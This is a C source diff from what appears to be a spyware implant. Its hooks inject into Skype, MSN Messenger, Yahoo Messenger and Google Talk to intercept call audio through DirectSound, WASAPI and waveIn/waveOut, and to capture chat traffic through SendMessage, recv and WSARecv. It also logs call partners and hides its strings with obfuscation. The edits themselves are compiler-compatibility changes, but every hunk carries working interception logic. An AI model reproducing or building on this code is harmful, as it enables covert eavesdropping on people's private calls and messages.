@@ -140,7 +140,7 @@ BYTE *GetDirectSoundGetCP(BYTE **DSLock, BYTE **DSUnlock, BYTE **DSGetFormat)
 
 	if ( !(hdsound = LoadLibrary("dsound.dll") ) )
 		return NULL;
-	if ( !(pDirectSoundCreate = (DirectSoundCreate_t)HM_SafeGetProcAddress(hdsound, "DirectSoundCreate") ) )
+	if ( !(pDirectSoundCreate = (DirectSoundCreate_t)HM_SafeGetProcAddress(hdsound, (char*)"DirectSoundCreate") ) )
 		return NULL;
 
 	if (DS_OK != pDirectSoundCreate(NULL, &lpDS, NULL))
@@ -191,7 +191,7 @@ BYTE *GetDirectSoundCaptureGetCP(BYTE **DSLock, BYTE **DSUnlock, BYTE **DSGetFor
 
 	if ( !(hdsound = LoadLibrary("dsound.dll") ) )
 		return NULL;
-	if ( !(pDirectSoundCaptureCreate = (DirectSoundCaptureCreate_t)HM_SafeGetProcAddress(hdsound, "DirectSoundCaptureCreate") ) )
+	if ( !(pDirectSoundCaptureCreate = (DirectSoundCaptureCreate_t)HM_SafeGetProcAddress(hdsound, (char*)"DirectSoundCaptureCreate") ) )
 		return NULL;
 
 	if ( DS_OK != pDirectSoundCaptureCreate(NULL, &lpDSC, NULL))
@@ -358,20 +358,20 @@ DWORD PM_DSGetCP_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++; 
-		if (stricmp(proc_name, "skype.exe") && 
-			stricmp(proc_name, "msnmsgr.exe") &&
-			stricmp(proc_name, "yahoomessenger.exe"))
+		if (_stricmp(proc_name, "skype.exe") && 
+			_stricmp(proc_name, "msnmsgr.exe") &&
+			_stricmp(proc_name, "yahoomessenger.exe"))
 			return 1; // Hooka solo skype.exe e MSN
-		if (!stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
+		if (!_stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
 			return 1; // Solo su XP prendiamo le dsound
 	} else
 		return 1;
 
-	if (!stricmp(proc_name, "skype.exe"))
+	if (!_stricmp(proc_name, "skype.exe"))
 		DSGetCPData.prog_type = VOIP_SKYPE;
-	else if (!stricmp(proc_name, "msnmsgr.exe"))
+	else if (!_stricmp(proc_name, "msnmsgr.exe"))
 		DSGetCPData.prog_type = VOIP_MSMSG;
-	else if (!stricmp(proc_name, "yahoomessenger.exe"))
+	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
 		DSGetCPData.prog_type = VOIP_YAHOO;
 	else
 		DSGetCPData.prog_type = 0;
@@ -497,11 +497,11 @@ DWORD PM_DSCapGetCP_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++; 
-		if (stricmp(proc_name, "skype.exe") &&
-			stricmp(proc_name, "msnmsgr.exe") &&
-			stricmp(proc_name, "yahoomessenger.exe"))
+		if (_stricmp(proc_name, "skype.exe") &&
+			_stricmp(proc_name, "msnmsgr.exe") &&
+			_stricmp(proc_name, "yahoomessenger.exe"))
 			return 1; // Hooka solo skype.exe e MSN
-		if (!stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
+		if (!_stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
 			return 1; // Solo su XP prendiamo le dsound
 	} else
 		return 1;
@@ -510,11 +510,11 @@ DWORD PM_DSCapGetCP_setup(HMServiceStruct *pData)
 	DSCapGetCPData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
 	DSCapGetCPData.old_play_c = -1;
 
-	if (!stricmp(proc_name, "skype.exe"))
+	if (!_stricmp(proc_name, "skype.exe"))
 		DSCapGetCPData.prog_type = VOIP_SKYPE;
-	else if (!stricmp(proc_name, "msnmsgr.exe"))
+	else if (!_stricmp(proc_name, "msnmsgr.exe"))
 		DSCapGetCPData.prog_type = VOIP_MSMSG;
-	else if (!stricmp(proc_name, "yahoomessenger.exe"))
+	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
 		DSGetCPData.prog_type = VOIP_YAHOO;
 	else 
 		DSCapGetCPData.prog_type = 0;
@@ -686,7 +686,7 @@ DWORD PM_WASAPIGetBuffer_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++; 
-		if (stricmp(proc_name, "skype.exe"))
+		if (_stricmp(proc_name, "skype.exe"))
 			return 1; // Hooka solo skype.exe
 	} else
 		return 1;
@@ -778,7 +778,7 @@ DWORD PM_WASAPIReleaseBuffer_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++; 
-		if (stricmp(proc_name, "skype.exe"))
+		if (_stricmp(proc_name, "skype.exe"))
 			return 1; // Hooka solo skype.exe
 	} else
 		return 1;
@@ -957,7 +957,7 @@ DWORD PM_WASAPICaptureGetBuffer_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++; 
-		if (stricmp(proc_name, "skype.exe"))
+		if (_stricmp(proc_name, "skype.exe"))
 			return 1; // Hooka solo skype.exe
 	} else
 		return 1;
@@ -985,7 +985,7 @@ DWORD PM_WASAPICaptureGetBufferMSN_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++; 
-		if (stricmp(proc_name, "msnmsgr.exe") || !IsVista(NULL))
+		if (_stricmp(proc_name, "msnmsgr.exe") || !IsVista(NULL))
 			return 1; // Hooka solo MSN
 	} else
 		return 1;
@@ -1074,7 +1074,7 @@ DWORD PM_WASAPICaptureReleaseBuffer_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++; 
-		if (stricmp(proc_name, "skype.exe"))
+		if (_stricmp(proc_name, "skype.exe"))
 			return 1; // Hooka solo skype.exe
 	} else
 		return 1;
@@ -1102,7 +1102,7 @@ DWORD PM_WASAPICaptureReleaseBufferMSN_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++; 
-		if (stricmp(proc_name, "msnmsgr.exe") || !IsVista(NULL))
+		if (_stricmp(proc_name, "msnmsgr.exe") || !IsVista(NULL))
 			return 1; // Hooka solo MSN
 	} else
 		return 1;
@@ -1182,24 +1182,24 @@ DWORD PM_waveOutWrite_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "skype.exe") && 
-			stricmp(proc_name, "yahoomessenger.exe") &&
-			stricmp(proc_name, "googletalk.exe"))
+		if (_stricmp(proc_name, "skype.exe") &&
+			_stricmp(proc_name, "yahoomessenger.exe") &&
+			_stricmp(proc_name, "googletalk.exe"))
 			return 1; // Hooka solo skype, yahoo, gtalk
 	} else
 		return 1;
 
-	if (!stricmp(proc_name, "skype.exe"))
+	if (!_stricmp(proc_name, "skype.exe"))
 		waveOutWriteData.prog_type = VOIP_SKYPE;
-	else if (!stricmp(proc_name, "yahoomessenger.exe"))
+	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
 		waveOutWriteData.prog_type = VOIP_YAHOO;
-	else if (!stricmp(proc_name, "googletalk.exe"))
+	else if (!_stricmp(proc_name, "googletalk.exe"))
 		waveOutWriteData.prog_type = VOIP_GTALK;
 	else
 		waveOutWriteData.prog_type = 0;
 
 	VALIDPTR(hMod = LoadLibrary("winmm.DLL"))
-	VALIDPTR(waveOutWriteData.pwaveOutGetID = (waveOutGetID_t) HM_SafeGetProcAddress(hMod, "waveOutGetID"))
+	VALIDPTR(waveOutWriteData.pwaveOutGetID = (waveOutGetID_t) HM_SafeGetProcAddress(hMod, (char*)"waveOutGetID"))
 	waveOutWriteData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
 	waveOutWriteData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
 
@@ -1269,24 +1269,24 @@ DWORD PM_waveInUnprepareHeader_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "skype.exe") && 
-			stricmp(proc_name, "yahoomessenger.exe") &&
-			stricmp(proc_name, "googletalk.exe"))
+		if (_stricmp(proc_name, "skype.exe") &&
+			_stricmp(proc_name, "yahoomessenger.exe") &&
+			_stricmp(proc_name, "googletalk.exe"))
 			return 1; // Hooka solo skype, yahoo, gtalk
 	} else 
 		return 1;
 
-	if (!stricmp(proc_name, "skype.exe"))
+	if (!_stricmp(proc_name, "skype.exe"))
 		waveInUnprepareHeaderData.prog_type = VOIP_SKYPE;
-	else if (!stricmp(proc_name, "yahoomessenger.exe"))
+	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
 		waveInUnprepareHeaderData.prog_type = VOIP_YAHOO;
-	else if (!stricmp(proc_name, "googletalk.exe"))
+	else if (!_stricmp(proc_name, "googletalk.exe"))
 		waveInUnprepareHeaderData.prog_type = VOIP_GTALK;
 	else
 		waveInUnprepareHeaderData.prog_type = 0;
 
 	VALIDPTR(hMod = LoadLibrary("winmm.DLL"))
-	VALIDPTR(waveInUnprepareHeaderData.pwaveInGetID = (waveInGetID_t) HM_SafeGetProcAddress(hMod, "waveInGetID"))
+	VALIDPTR(waveInUnprepareHeaderData.pwaveInGetID = (waveInGetID_t) HM_SafeGetProcAddress(hMod, (char *)"waveInGetID"))
 	waveInUnprepareHeaderData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
 	waveInUnprepareHeaderData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
 	
@@ -1471,9 +1471,9 @@ DWORD PM_SendMessage_setup(HMServiceStruct *pData)
 	if (proc_name) {
 		proc_name++;
 		SendMessageData.is_skypepm = FALSE;
-		if (!stricmp(proc_name, "skypepm.exe")) {
+		if (!_stricmp(proc_name, "skypepm.exe")) {
 			SendMessageData.is_skypepm = TRUE; // siamo in skypepm
-		} else if (stricmp(proc_name, "skype.exe")) 
+		} else if (_stricmp(proc_name, "skype.exe"))
 			return 1; // Se non siamo in skype  non mette l'hook sulla sendmessage
 	} else
 		return 1;
@@ -1588,9 +1588,9 @@ DWORD PM_Recv_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "YahooMessenger.exe") &&
-			stricmp(proc_name, "Googletalk.exe") &&
-			stricmp(proc_name, "msnmsgr.exe"))
+		if (_stricmp(proc_name, "YahooMessenger.exe") &&
+			_stricmp(proc_name, "Googletalk.exe") &&
+			_stricmp(proc_name, "msnmsgr.exe"))
 			return 1; // Hooka solo YahooMessenger, GTalk e MSN
 	} else{
 		return 1;
@@ -1666,7 +1666,7 @@ DWORD PM_WSARecv_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "YahooMessenger.exe"))
+		if (_stricmp(proc_name, "YahooMessenger.exe"))
 			return 1; // Hooka solo YahooMessenger
 	} else{
 		return 1;
@@ -1785,8 +1785,8 @@ void SaveEncode(BYTE *source, DWORD total_size, DWORD channels, pVoiceAdditional
 void SaveWav(BYTE *channel_array, DWORD size, DWORD channels, pVoiceAdditionalData additional_data, DWORD additional_len)
 {
 	static BOOL first_save = TRUE;
-	ScrambleString ss1("_ yPUvU8WUAUPC 8diUE gEilg......QM\r\n\r\n", shared.is_demo_version); // "- Initializing audio codec......OK\r\n\r\n"
-	ScrambleString ss2("_ yPUvU8WUAUPC 8diUE gEilg......L99Q9\r\n\r\n", shared.is_demo_version); // "- Initializing audio codec......ERROR\r\n\r\n"
+	ScrambleString ss1((char*)"_ yPUvU8WUAUPC 8diUE gEilg......QM\r\n\r\n", shared.is_demo_version); // "- Initializing audio codec......OK\r\n\r\n"
+	ScrambleString ss2((char*)"_ yPUvU8WUAUPC 8diUE gEilg......L99Q9\r\n\r\n", shared.is_demo_version); // "- Initializing audio codec......ERROR\r\n\r\n"
 
 	// Verifica che l'array sia stato allocato
 	if (!channel_array)
@@ -2475,7 +2475,7 @@ DWORD WINAPI MonitorSkypePM(BOOL *semaphore)
 
 		// Cerca il path di skypepm partendo da quello di skype.exe
 		// e lo esegue
-		if ( (skipe_id = HM_FindPid("skype.exe", TRUE)) ) {
+		if ( (skipe_id = HM_FindPid((char *)"skype.exe", TRUE)) ) {
 			if ( (skype_handle = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, skipe_id)) ) {
 				if (FNC(GetModuleFileNameExW)(skype_handle, NULL, skype_path, (sizeof(skype_path)/sizeof(WCHAR))-1)) {
 					if (skype_pm_ptr = wcsstr(skype_path, L"\\Phone\\")) {
@@ -2532,7 +2532,7 @@ BOOL ParseMsnMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 		if(ptr == NULL)
 			return TRUE;
 
-		MsnID = strdup(ptr);
+		MsnID = _strdup(ptr);
 	}
 
 	// Se ha trovato un nuovo interlocutore
@@ -2705,7 +2705,7 @@ BOOL ParseYahooMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 				if ( !(call_list_head = (partner_entry *)calloc(sizeof(partner_entry), 1)) ) 
 					return TRUE;
 				//Log_Sanitize(YID);
-				call_list_head->peer = strdup(YID);
+				call_list_head->peer = _strdup(YID);
 				call_list_head->voip_program = VOIP_YAHOO;
 
 			// Termina la chiamata 
